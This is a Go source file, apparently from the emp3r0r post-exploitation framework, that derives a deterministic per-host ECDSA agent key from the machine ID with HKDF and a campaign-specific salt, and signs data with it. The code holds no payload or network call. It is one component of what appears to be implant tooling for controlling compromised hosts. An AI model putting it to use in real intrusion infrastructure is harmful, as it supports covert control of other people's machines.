package agentutils

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"golang.org/x/crypto/hkdf"
)

var (
	// AgentKey is the unique key for this agent
	AgentKey *ecdsa.PrivateKey
)

// GetAgentKey derives a deterministic agent key from MachineID
func GetAgentKey() error {
	machineID := util.GetMachineID()
	logging.Infof("Deriving agent key from MachineID: %s", machineID)

	// info for HKDF
	info := []byte("emp3r0r-agent-key-v1")

	// Salt: MagicString ensures that keys are specific to this emp3r0r build/campaign
	salt := []byte(def.MagicString)

	// HKDF reader
	hkdfReader := hkdf.New(sha256.New, []byte(machineID), salt, info)

	// Generate key using deterministic reader
	var err error
	AgentKey, err = ecdsa.GenerateKey(elliptic.P256(), hkdfReader)
	if err != nil {
		logging.Errorf("Failed to derive specific agent key: %v. Falling back to random key.", err)
		// Fallback to random key if derivation fails (highly unlikely)
		AgentKey, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			return fmt.Errorf("generate random key: %v", err)
		}
	}

	return nil
}

// SignWithAgentKey signs data with the agent's unique key
func SignWithAgentKey(data []byte) ([]byte, error) {
	if AgentKey == nil {
		if err := GetAgentKey(); err != nil {
			return nil, fmt.Errorf("get key: %v", err)
		}
	}
	return transport.SignJSONWithKey(AgentKey, data)
}
